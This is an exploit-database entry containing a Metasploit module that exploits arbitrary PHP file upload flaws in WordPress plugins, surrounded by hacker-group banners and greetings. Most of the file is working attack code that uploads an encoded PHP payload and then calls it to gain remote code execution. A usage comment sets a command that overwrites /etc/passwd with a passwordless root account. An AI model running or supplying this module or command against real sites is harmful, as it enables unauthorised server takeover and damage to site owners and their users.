@@ -1,0 +1,172 @@
+id: 18976
+date: 07/12/2012
+title: WordPress Generic plugins Arbitrary File Upload (Metasploit)
+author: KedAns-Dz
+cves: 
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0               I'm KedAns-Dz member from Inj3ct0r Team                1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+###
+# Title : WordPress Generic plugins Arbitrary File Upload (Metasploit)
+# Author : KedAns-Dz
+# E-mail : ked-h (@hotmail.com / @1337day.com / @exploit-id.com / @dis9.com)
+# Home : Hassi.Messaoud (30500) - Algeria -(00213555248701)
+# Web Site : www.1337day.com | www.inj3ct0rs.com
+# FaCeb0ok : http://fb.me/Inj3ct0rK3d
+# Friendly Sites : www.r00tw0rm.com * www.exploit-id.com * www.dis9.com
+# platform : php - Remote Exploit
+# Type : Generic Remote Exploit
+# Tested on : Windows XP-SP3 (Fr) / Linux.BackTrack5-rc2
+# Reference : [http://1337day.com/related/18686]
+###
+
+# <3 <3 Greetings t0 Palestine <3 <3
+# Happy 50 Year's in Independence All Algerians <3 <3
+----neXt-->
+# SELECT From _K3d @Welc0m BaCk All Inj3ct0r's ^_^ :D
+# 2 AND 0=' s0 Use DDos LamErZ_Kid'Z - Big F^ n00b's--
+
+###########
+
+##
+# $Id: wp_gupload.rb 2012-07-09 04:35:01Z KedAns-Dz $
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+  super(update_info(info,
+  'Name' => 'WordPress Generic plugins Arbitrary File Upload',
+  'Description' => %q{
+   This module exploits an arbitrary PHP File Upload and Code Execution flaw in some
+  WordPress blog software plugins. The vulnerability allows for arbitrary file upload 
+  and remote code execution POST Data to Vulnerable Script/File in the plugin.
+   },
+   'Author' => [ 'KedAns-Dz <ked-h[at]1337day.com>' ], # MSF Module
+   'License' => MSF_LICENSE,
+   'Version' => '0.1', # Beta Version Just for Pene-Test/Help - Wait the Best !
+   'References' => [ 
+     'URL', 'http://1337day.com/related/18686',
+     'URL', 'http://packetstormsecurity.org/search/?q=wordpress+shell+upload' 
+	],
+   'Privileged' => false,
+   'Payload' =>
+    {
+    'Compat'  => { 'ConnectionType' => 'find', },
+    },
+    'Platform'       => 'php',
+    'Arch'           => ARCH_PHP,
+    'Targets'        => [[ 'Automatic', { }]],
+    'DisclosureDate' => 'Jun 16 2012',
+    'DefaultTarget' => 0))
+
+   register_options(
+    [
+     OptString.new('TARGETURI', [true, "The URI path to WordPress", "/"]),
+     OptString.new('PLUGIN', [true, "The Full URI path to Plugin and Vulnerable File", "/"]),
+     OptString.new('UDP', [true, "Full Path After Upload", "/"])
+    # Example :
+    # set TARGETURI http://127.0.0.1/wp
+    # set PLUGIN wp-content/plugins/foxypress/uploadify/uploadify.php
+    # set UDP wp-content/affiliate_images/
+    # set RHOST 127.0.0.1
+    # set PAYLOAD php/exec
+    # set CMD echo "toor::0:0:::/bin/bash">/etc/passwd
+    # exploit
+    ], self.class)
+  end
+
+   def check
+    uri = datastore['TARGETURI']
+    plug = datastore['PLUGIN']
+	
+    res = send_request_cgi({
+    'method' => 'GET',
+    'uri' => "#{uri}'/'#{plug}"
+    })
+    
+ if res and res.code == 200
+   return Exploit::CheckCode::Detected
+  else
+   return Exploit::CheckCode::Safe
+   end
+ end
+
+  def exploit
+
+   uri = datastore['TARGETURI']
+   plug = datastore['PLUGIN']
+   path = datastore['UDP']
+ 
+   peer = "#{rhost}:#{rport}"
+
+   post_data = Rex::MIME::Message.new
+   post_data.add_part("<?php #{payload.encoded} ?>",
+   "application/octet-stream", nil, 
+   "form-data; name=\"Filedata\"; filename=\"#{rand_text_alphanumeric(6)}.php\"")
+
+   print_status("#{peer} - Sending PHP payload")
+
+  res = send_request_cgi({
+  'method' => 'POST',
+  'uri'    => "#{uri}'/'#{plug}",
+  'ctype'  => 'multipart/form-data; boundary=' + post_data.bound,
+  'data'   => post_data.to_s
+  })
+
+   if not res or res.code != 200 or res.body !~ /\{\"raw_file_name\"\:\"(\w+)\"\,/
+   print_error("#{peer} - File wasn't uploaded, aborting!")
+   return
+   end
+
+   print_good("#{peer} - Our payload is at: #{$1}.php! Calling payload...")
+   res = send_request_cgi({
+   'method' => 'GET',
+   'uri'    => "#{uri}'/'#{path}'/'#{$1}.php"
+   })
+
+   if res and res.code != 200
+   print_error("#{peer} - Server returned #{res.code.to_s}")
+   end
+
+   end
+
+end
+
+############# << ThE|End , Good LuCk All ^_^ !
+
+#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]===============================================
+# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > | Caddy-Dz * Mennouchi Islem * Rizky Oz * HMD-Cr3w
+# +> Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (1337day.com) * CrosS (r00tw0rm.com)
+# Inj3ct0r Members 31337 : Indoushka * KnocKout * SeeMe * Kalashinkov3 * ZoRLu * anT!-Tr0J4n * Angel Injection
+# NuxbieCyber (www.1337day.com/team) * Dz Offenders Cr3w * Algerian Cyber Army * xDZx * TM.mOsta * HD Moore
+# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X * KeyStr0ke
+# JF * Kha&miX * Ev!LsCr!pT_Dz * KinG Of PiraTeS * TrOoN * T0xic * L3b-r1Z * Chevr0sky * Black-ID * Barbaros-DZ
+# packetstormsecurity.org * metasploit.com * r00tw0rm.com * OWASP Dz * Dis9-UE * All Security and Exploits Webs
+#============================================================================================================
+
+
+
+#  0day.today [2023-03-23]  #
